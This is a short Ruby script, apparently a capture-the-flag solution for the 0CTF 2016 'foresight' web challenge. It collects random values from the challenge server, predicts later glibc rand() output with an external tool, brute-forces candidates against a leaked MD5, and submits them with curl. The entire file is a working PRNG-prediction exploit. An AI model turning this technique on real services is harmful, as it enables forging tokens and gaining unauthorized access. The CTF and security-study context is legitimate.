#!/usr/bin/env ruby
#
#
require 'thread/pool'
pool = Thread.pool(10)
@result = Array.new;
@url = "http://202.120.7.202:8888/"
@str = ""
target_md5 = ""
1.times do |i|

        data = `curl -c cookie -b cookie -s #{(@url+" ")*40} http://202.120.7.202:8888/?go=1`
        result = data.scan /(\d+)<code>/
        target_md5 =  data.split("\n")[-1]
           @result.push result
end
#target_md5 = `curl -s -c cookie -b cookie http://202.120.7.202:8888/?go=1`
print @result.join(" ")

predict = `~/ctf/0ctf2016/web/foresight/foresight/foresee.py glibc random -o #{@result.join(" ")} -c 6 `
puts "remote md5: #{target_md5}"
require 'digest'

pred = predict.split("\n")[-1].split(" ")
p pred
pred.shift
0.upto 32 do |i|
    tmp = pred.dup

    0.upto 4 do |j|
        tmp[j] = (tmp[j].to_i + 1).to_s if i.to_s(2).rjust(8,'0')[8-j-1] == '1'
    end
    md5 = Digest::MD5.new
    hash = md5.hexdigest tmp.join
    p "#{tmp.join " "} --- #{hash}   # #{i.to_s(2).rjust(8,'0')}"
    if target_md5.end_with? hash
        cmd = "curl -v -s -b cookie -c cookie 'http://202.120.7.202:8888/?check\\[0\\]=#{tmp[0]}&check\\[1\\]=#{tmp[1]}&check\\[2\\]=#{tmp[2]}&check\\[3\\]=#{tmp[3]}&check\\[4\\]=#{tmp[4]}'"
        puts `#{cmd}`
        puts cmd
        puts "wtf!!!"
    end
end
#File.unlink "cookie"
#p @result
#
